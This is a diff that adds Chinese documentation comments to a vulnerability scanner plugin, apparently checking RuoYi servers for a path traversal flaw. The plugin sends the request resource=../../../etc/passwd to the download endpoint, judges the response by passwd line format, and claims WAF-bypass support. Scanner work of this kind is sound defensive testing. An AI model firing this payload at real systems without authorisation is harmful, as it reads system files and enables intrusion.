@@ -87,6 +87,14 @@ class RuoyiFileReadPathPlugin(PluginBase):
     supports_waf_bypass = True
 
     def verify(self, target, session):
+        """用路径穿越 payload 读取 /etc/passwd，按真实文件特征判定漏洞
+
+        与 file_read 插件的差异：payload 为相对穿越（resource=../../../etc/passwd），
+        且判定基于 /etc/passwd 标准行格式（username:x:uid:gid）而非简单的 root 子串
+        @param target: 目标主机，用于拼接下载接口地址
+        @param session: 复用的 HTTP 会话对象
+        @return: ScanResult——200 且响应含 ≥2 个 passwd 账户行（root/系统账户）为 CONFIRMED，否则 SAFE
+        """
         # 路径穿越 payload：从若依默认资源目录向上穿越读 /etc/passwd
         url = join_url(target, "/common/download/resource?resource=../../../etc/passwd")
         try:
@@ -119,6 +127,7 @@ class RuoyiFileReadPathPlugin(PluginBase):
                 )
 
         # 400/403/404 → 拦截或端点不存在；200 但无特征 → 安全
+        # 200 分支重复调用判据函数仅为取用其 evidence 文本作安全原因，避免另写一套判定逻辑
         if code in (400, 403):
             reason = f"HTTP {code} 路径被拦截"
         elif code == 404:
